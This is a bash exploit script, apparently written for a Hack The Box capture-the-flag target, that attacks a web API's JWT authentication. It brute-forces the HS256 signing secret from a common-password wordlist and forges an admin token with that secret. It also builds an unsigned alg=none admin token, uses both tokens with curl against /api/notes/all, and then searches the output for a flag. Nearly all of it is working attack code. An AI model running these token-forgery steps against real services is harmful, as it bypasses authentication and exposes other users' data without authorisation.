#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
PORT=${2:?PORT}
TO=${3:-8}
BASE_OUT=${4:-/workspace/recon/httpx}
OUT_DIR="$BASE_OUT/${IP}_${PORT}"
mkdir -p "$OUT_DIR"
API_BASE="http://$IP:$PORT"
TOKEN=$(cat "$OUT_DIR/token.txt")
WL="/workspace/recon/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt"
# 1) Brute HS256 secret (first 5000 words)
python3 /workspace/recon/scripts/jwt_bruteforce.py "$TOKEN" "$WL" > "$OUT_DIR/jwt_secret.txt" || true
SECRET=""
if [[ -s "$OUT_DIR/jwt_secret.txt" ]]; then SECRET=$(head -n1 "$OUT_DIR/jwt_secret.txt"); fi
# 2) If secret found, forge admin token and request /api/notes/all
if [[ -n "$SECRET" ]]; then
  echo "Using secret: $SECRET" > "$OUT_DIR/jwt_secret_used.txt"
  echo '{"role":"admin","isAdmin":true,"email":"admin@local"}' > "$OUT_DIR/claims.json"
  FORGED=$(python3 /workspace/recon/scripts/jwt_forge.py "$TOKEN" "$SECRET" "$(cat $OUT_DIR/claims.json)" || true)
  if [[ -n "$FORGED" ]]; then
    echo "$FORGED" > "$OUT_DIR/token_forged.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $FORGED" "$API_BASE/api/notes/all" > "$OUT_DIR/notes_all_forged.json" || true
  fi
fi
# 3) Try alg=none fallback
NONE=$(python3 - <<'PY'
import json,base64,time,sys
from pathlib import Path
login_token = Path(sys.argv[1]).read_text().strip()
h,p,_ = login_token.split('.')
now=int(time.time())
payload={'id':'00000000-0000-0000-0000-000000000001','email':'admin@local','iat':now,'exp':now+3600,'role':'admin','isAdmin':True}
hb=base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
pb=base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).decode().rstrip('=')
print(hb+'.'+pb+'.')
PY
"$OUT_DIR/token.txt")
printf "%s" "$NONE" > "$OUT_DIR/token_none.txt"
curl -fsS -m "$TO" --connect-timeout "$TO" -i -H "Authorization: Bearer $NONE" "$API_BASE/api/notes/all" > "$OUT_DIR/notes_all_none.head" || true
# 4) Search for HTB flag in any new outputs
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" > "$OUT_DIR/jwt_hits.txt" || true
sed -n '1,200p' "$OUT_DIR/jwt_hits.txt" || true
